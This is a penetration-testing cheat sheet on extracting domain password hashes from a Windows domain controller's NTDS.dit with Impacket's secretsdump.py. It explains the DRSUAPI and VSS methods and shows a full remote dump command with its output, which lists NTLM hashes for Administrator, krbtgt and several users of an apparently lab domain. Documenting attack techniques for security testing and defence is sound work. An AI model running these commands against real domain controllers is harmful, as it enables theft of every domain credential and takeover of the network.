===================================================================================================================================
OS Credential Dumping (NTDS) using the Windows tool 'secretsdump' (Impacket Framework)
===================================================================================================================================

The objective is to extract the password hashes of all the domain accounts that are stored in the NTDS.dit file of a Domain Controller.
A valid domain account with high privileges  (e.g. member of the 'Domain admins' group or the 'Administrators' group of the Domain Controller)
is required to dump the NTDS.dit file and the registry hive 'HKLM\SYSTEM'.
By default, the NTDS file (NTDS.dit) is located in %SystemRoot%\NTDS\ntds.dit of a domain controller.

> Usefull link: https://attack.mitre.org/techniques/T1003/003/

Information regarding Secretsdump (Impacket Framework)
--------------------------------------------------------
> https://github.com/fortra/impacket
> https://github.com/fortra/impacket/blob/master/examples/secretsdump.py

There are 2 methods with secretsdump.py to remotely dump the domain password hashes (NTDS.DIT). 
The script initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). 
After the work is done, things are restored to the original state.

Method 1. DRSUAPI
------------------
Get the domain users list and get its hashes and Kerberos keys using [MS-DRDS] DRSGetNCChanges() call, replicating just the attributes we need.
It uses drsuapi RPC interface create a handle, trigger replication, and combined with additional drsuapi calls to convert the resultant
linked-lists into readable format.

Method 2. VSS (Volume Shadow copy Service)
-------------------------------------------
Extract NTDS.dit via vssadmin executed with the smbexec or wmiexec approach. It's copied on the temp dir and parsed remotely.


--------------------------------------------------------------------------------------------------------
Example - Dumping remotely domain password hashes using the script 'secretsdump.py' and the VSS method
--------------------------------------------------------------------------------------------------------

Note: The parameter "-user-status" is important to be able to identify the disabled accounts.

$ python3 secretsdump.py -just-dc-ntlm -user-status -use-vss -exec-method wmiexec administrator@192.168.1.50

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
Password:
[*] Target system bootKey: 0x941140bd825386b732031d5c5b01ae8a
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using wmiexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: b175740e0908fe396a15b0dc5631e72a
[*] Reading and decrypting hashes from \\192.168.1.50\ADMIN$\Temp\btprVJMN.tmp 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7a558c1aa1212fb2dd8940d149b51c6b::: (status=Enabled)
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (status=Disabled)
backup:1008:aad3b435b51404eeaad3b435b51404ee:1d6fcbd306077d663e23775e55b3f2e5::: (status=Enabled)
TEMP-DC$:1009:aad3b435b51404eeaad3b435b51404ee:cf8e5ee10c7615bc73f4b2511e09cf19::: (status=Enabled)
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:208ae4a2c5aa7b40d0473499408a2670::: (status=Disabled)
Security-Test-Lab.Local\EDUARDO_MAXWELL:1112:aad3b435b51404eeaad3b435b51404ee:63897a6fb3ac955b0ec847786bfa9d23::: (status=Enabled)
Security-Test-Lab.Local\INES_TILLMAN:1113:aad3b435b51404eeaad3b435b51404ee:70d56a72e9cacdc6df36d990adb3b073::: (status=Enabled)
<SNIP>
[*] Cleaning up...
